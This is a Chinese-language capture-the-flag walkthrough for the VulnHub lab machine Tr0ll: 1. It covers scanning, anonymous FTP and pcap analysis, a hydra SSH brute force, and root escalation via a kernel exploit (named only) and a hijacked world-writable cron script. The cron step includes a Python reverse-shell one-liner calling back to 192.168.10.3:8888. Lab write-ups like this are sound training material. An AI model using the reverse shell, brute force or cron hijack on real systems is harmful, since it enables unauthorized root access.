# Tr0ll: 1

https://www.vulnhub.com/entry/tr0ll-1,100/

difficulty: Beginner

Finish Date：2024-4-9

## IP

192.168.10.154

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.10.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d618d9ef75d31c29be14b52b1854a9c0 (DSA)
|   2048 ee8c64874439538c24fe9d39a9adeadb (RSA)
|   256 0e66e650cf563b9c678b5f56caae6bf4 (ECDSA)
|_  256 b28be2465ceffddc72f7107e045f2585 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/secret
```

看到开放了 21 ftp 端口，并且可以匿名登陆，先看看里面有什么有价值的信息。发现了一个 lol.pcap 抓包文件，下载到 kali，用 wireshark 打开，看看有什么内容。Follow Tcp 后发现其中下载了一个名为 secret_stuff.txt 的文件，其中的内容对应为：

```
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
```

sup3rs3cr3tdirlol 看上去好像是个目录，或者是个密码，尝试在 80 端口上访问看看。http://192.168.10.154/sup3rs3cr3tdirlol/ 发现了一个名为 roflmao 的二进制文件，看看其中内容。

```
strings roflmao

Find address 0x0856BF to proceed  <-- 0x0856BF 可能是有一定特殊含义
```

盲猜可能是一个目录，尝试在 web 服务上访问这个目录：http://192.168.10.154/0x0856BF/ 进一步发现了 2 个有意思的文件夹。

http://192.168.10.154/0x0856BF/good_luck/which_one_lol.txt 对应的看上去像是用户名。

http://192.168.10.154/0x0856BF/this_folder_contains_the_password/Pass.txt 这个可能是密码。

尝试用获得的用户名和密码，使用 hydra 对目标机器进行 ssh 爆破，密码不对，再次看密码文件夹的提示，有没有可能文件名 Pass.txt 就是密码，再次尝试。果然是这个密码：

```
[22][ssh] host: 192.168.10.154   login: overflow   password: Pass.txt
```

进行登陆，显示的 tty 不太友好，先升级 tty : python -c 'import pty; pty.spawn("/bin/bash")'。过了一会系统把会话中断了，看样子系统上有计划任务，5 分钟就中断会话。

## flag

### 方式 1：

uname -a 查看到系统内核为：Linux troll 3.13.0 ，搜索了以下内核对应的漏洞为 'overlayfs' Local Privilege Escalation
将 c 代码下载到目标机器的/tmp 目录，然后进行编译，最后运行得到了 root 用户，获得了 flag：

```
# cat proof.txt
Good job, you did it!

702a8c18d29c6f3ca0d99ef5712bfbdc

```

### 方式 2：

看到目标系统每隔 5 分钟会将会话中断，应该是计划任务 root 用户调用的，所以可以看看找找这个执行的脚本，我们有没有写入权限。

先查看下 crontab 的日志文件，可能有脚本执行提示信息：

```
cat /var/log/cronlog

*/2 * * * * cleaner.py
```

找到 cleaner.py 所在的路径为：/lib/log/cleaner.py 这个文件我们有完全写入的权限，就可以把我们的反弹 shell 操作替换其中的清理/tmp 目录的操作，获得 root 的 shell。

```
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /tmp/* ')
    <-- 这里换成 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.3",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' -->
except:
	sys.exit()

-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
```

计划任务配置信息可能存在的几个地方：

```
/etc/crontab           <-- 维护Linux操作系统所需的系统任务

/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.monthly/
/etc/cron.weekly/

/var/spool/cron/crontabs/root  <-- 用户cron任务的配置文件存放目录，最后这个是用户名，每一个用户如果配置了 crontab -e 都会生成一个对应用户名的计划任务文件
```

查看到 /var/spool/cron/crontabs/root 或者执行 crontab -l 的内容：

```
*/5 * * * * /usr/bin/python /opt/lmao.py          <-- 每5分钟调用一次
*/2 * * * * /usr/bin/python /lib/log/cleaner.py   <-- 每2分钟调用一次，这里就会调用上面我们修改后的py脚本
```

/opt/lmao.py 的内容为：

```
#!/usr/bin/env python
import os

os.system('echo "TIMES UP LOL!"|wall')
os.system("pkill -u 'overflow'")
sys.exit()
```
